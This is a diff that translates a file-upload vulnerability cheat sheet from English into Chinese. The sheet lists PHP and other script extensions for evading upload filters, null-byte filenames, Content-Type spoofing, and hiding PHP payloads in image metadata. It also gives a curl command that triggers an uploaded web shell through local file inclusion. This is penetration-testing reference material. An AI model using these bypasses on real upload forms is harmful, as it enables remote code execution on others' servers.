@@ -1,26 +1,29 @@
-# Upload
+# 文件上传漏洞
 
-Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.
+如果处理不当，上传的文件可能会构成很大的风险。远程攻击者可以发送带有特殊构造的文件名或者有mime类型的multipart/form-data POST请求来执行任意代码。
 
 ## Summary
 
 * [Tools](#tools)
 * [Exploits](#exploits)
-    * [PHP Extension](#php-extension)
-    * [Other extensions](#other-extensions)
-    * [Upload tricks](#upload-tricks)
-    * [Picture upload with LFI](#picture-upload-with-lfi)
-    * [Configuration Files](#configuration-files)
-    * [CVE - Image Tragik](#cve---image-tragik)
+	* [PHP Extension](#php-extension)
+	* [Other extensions](#other-extensions)
+	* [Upload tricks](#upload-tricks)
+	* [Picture upload with LFI](#picture-upload-with-lfi)
+	* [Configuration Files](#configuration-files)
+	* [CVE - Image Tragik](#cve---image-tragik)
 * [References](#references)
 
 
 ## Tools
+
 - [Fuxploider](https://github.com/almandin/fuxploider)
 
 ## Exploits
 
 ### PHP Extension
+
+php后缀名
 
 ```powershell
 .php
@@ -29,7 +32,7 @@ Uploaded files may pose a significant risk if not handled correctly. A remote at
 .php5
 .php7
 
-Less known extensions
+很少有人知道的后缀名
 .pht
 .phar
 .phpt
@@ -37,13 +40,15 @@ Less known extensions
 .phtml
 .phtm
 
-Double extensions
+双重后缀名
 .jpeg.php
 .jpg.php
 .png.php
 ```
 
 ### Other extensions
+
+其他后缀名
 
 ```powershell
 asp : .asp, .aspx
@@ -54,15 +59,19 @@ Coldfusion: .cfm, .cfml, .cfc, .dbm
 
 ### Upload tricks
 
-- Null byte (eg: shell.php%00.gif, shell.php%00.png), works well against `pathinfo()`
-- Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
+上传欺骗方式
+
+- Null字节填充(eg:shell.php%00.gif, shell.php%00.png)，很好的攻击`pathinfo()`
+- Mime type, 修改 `Content-Type : application/x-php` 或者 `Content-Type : application/octet-stream` 为`Content-Type : image/gif`
+- 
 
 ### Picture upload with LFI
 
-Valid pictures hosting PHP code. Upload the picture and use a local file inclusion to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.
+在图片中隐写PHP代码。上传图片并使用本地文件包含可以执行这些代码，可以用以下命令执行相应代码`curl 'http://localhost/test.php?0=system' --data "1='ls'"`.
 
-- Picture Metadata, hide the payload inside a comment tag in the metadata.
+- 图片元数据，将payload可以注入到元数据的注释标记内。
 - Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating `getimagesize()` and `imagecreatefromgif()`.
+- 图片调整大小，将payload藏在压缩算法中来绕过调整大小。也可以攻击`getimagesize()` 和 `imagecreatefromgif()`.
 
 ### Configuration Files
 
